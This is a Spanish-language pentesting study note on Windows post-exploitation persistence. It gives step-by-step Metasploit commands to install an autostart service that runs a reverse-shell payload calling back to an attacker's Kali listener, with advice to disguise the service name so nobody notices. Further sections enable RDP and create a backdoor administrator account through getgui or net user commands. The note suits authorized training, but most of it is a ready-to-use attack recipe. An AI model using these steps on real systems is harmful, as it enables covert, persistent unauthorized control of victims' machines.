# ⚓ Persistencia en Windows: [[Metasploit]]

Este método consiste en crear un **Servicio de Windows** que ejecuta un payload (reverse shell) de forma automática. Es una técnica de persistencia de nivel de sistema.

- **Módulo:** `exploit/windows/persistence/service`
- **Requisito previo:** Tener una sesión de Meterpreter activa con privilegios de **Administrador** o **SYSTEM**.

## 🧐 1. ¿Qué es y qué hace este módulo?

Cuando ejecutas este módulo, Metasploit realiza las siguientes acciones en la víctima:

1. **Sube un ejecutable (.exe)** malicioso a una carpeta temporal del sistema.
2. **Crea un nuevo Servicio** en Windows que apunta a ese archivo ejecutable.
3. **Configura el inicio como "Automático"**: Esto significa que el payload se ejecutará en cuanto Windows arranque, **antes incluso de que cualquier usuario inicie sesión**.
### ¿Qué implica su uso?

- **Privilegios:** Necesitas permisos elevados para crear servicios. Si tienes éxito, el servicio normalmente correrá como `NT AUTHORITY\SYSTEM`.
- **Rastro (Forensics):** Crear un servicio nuevo es ruidoso. Un administrador atento puede ver el servicio sospechoso en `services.msc`.
- **Evasión:** El ejecutable subido es un payload estándar de Metasploit; si el antivirus (Windows Defender) está activo, es muy probable que lo borre al instante a menos que uses un codificador o bypass previo.

## 🚀 2. Configuración del Módulo
Desde tu consola de Metasploit:
- `use exploit/windows/persistence/service`
- `set SESSION <id_sesion>`
- `set LPORT <puerto>` Importante que sea distinto a la de la sesión actual.
- `set LHOST <IP_KALI>`
- `run o exploit`

Parámetros opcionales pero recomendados:
- `set SERVICE_NAME "<nombre_servicio>"`
- `set SERVICE_DESCRIPTION "<descripcion>"`
- Usa un nombre y descripción que parezcan reales, para que no sospeche nadie, y sea fácil que pasen desapercibidos

## 📡 3. Cómo volver a conectarte (The Listener)
Una vez que el módulo termina, tu sesión actual puede cerrarse o la víctima puede reiniciarse. Para recuperar el control, necesitas dejar un "oyente" (Handler) preparado en tu Kali:
1. Configurar el Handler:
	- ``use exploit/multi/handler`` 
	- ``set PAYLOAD windows/meterpreter/reverse_tcp`` 
		- Debe ser el mismo que usaste antes.
	- ``set LHOST <IP_KALI>`` 
	- ``set LPORT <puerto_configurado_antes>``  
	- ``run``
2. **La conexión:**
	- En cuanto la víctima encienda su PC, el servicio se iniciará.
	- El servicio intentará conectar con tu Kali.
	- Si tu Handler está encendido, recibirás una nueva sesión de Meterpreter automáticamente.

## 🗑️ 4. Cómo eliminar la persistencia (Limpieza)
1. **Detener y eliminar el servicio:** Desde una shell de Windows en la víctima:
	- ``sc stop <nombre_servicio>``
	- ``sc delete <nombre_servicio>``
2. **Borrar el archivo:** Busca la ruta del ejecutable que te indicó Metasploit durante la ejecución del módulo y bórralo manualmente.

# 🖥️Persistencia Vía [[RDP (Remote Desktop Protocol)#3. Uso de xfreerdp|RDP]]
## 🛠️ Método 1: Módulo de Metasploit (Solo activar)
Si solo necesitas activar el servicio porque ya conoces las credenciales de un usuario o vas a crearlo manualmente.
1. Seleccionar el módulo:
	- ``use post/windows/manage/enable_rdp``
- Le proporcionamos la sesión y solo activará el servicio RDP en la víctima.
## ⚡ Método 2: Script `getgui` (Todo en uno)
Este es el método más rápido dentro de una sesión de **Meterpreter**, ya que habilita el servicio y crea un usuario específico en un solo comando.
1. **Ejecución:**
- `run getgui -e -u <usuario> -p <password>`
	- `-e`: Habilita RDP.
	- `-u`: Crea el usuario.
	- `-p`: Define la contraseña.
## ⌨️ Método 3: Manual (Vía CMD Shell)
Si prefieres hacerlo manualmente o no tienes una sesión de Meterpreter completa:
1. **Crear el usuario:**
	- `net user <username> <password> /add`
2. Añadirlo al grupo de Administradores:
	- `net localgroup Administrators <username> /add`
3. Añadirlo al grupo de Usuarios de Escritorio Remoto:
	- `net localgroup "Remote Desktop Users" <username> /add`
## 🚀 Acceso Remoto desde Kali
Una vez configurado el acceso, utilizamos **xfreerdp** para conectarnos. Es la herramienta estándar en Kali por su rendimiento y compatibilidad.
**Comando de conexión:**
- `xfreerdp /u:<usuario> /p:<password> /v:<IP>`
## 🚩 Consideraciones Técnicas

- **Visibilidad:** Habilitar RDP suele levantar alertas en redes monitorizadas. Además, si un usuario está usando la máquina físicamente y tú te conectas, podrías cerrarle la sesión (dependiendo de la versión de Windows).
- **Firewall:** El módulo de Metasploit suele intentar abrir el puerto **3389** en el Firewall de Windows, pero si hay un Firewall de red externo, la conexión podría ser bloqueada.
- **Privilegios:** Necesitas privilegios de **Administrador** en la sesión inicial para realizar estas acciones.
#
--- 
**Navegación**:
- Anterior: [[5.1 Post-Explotación Windows]]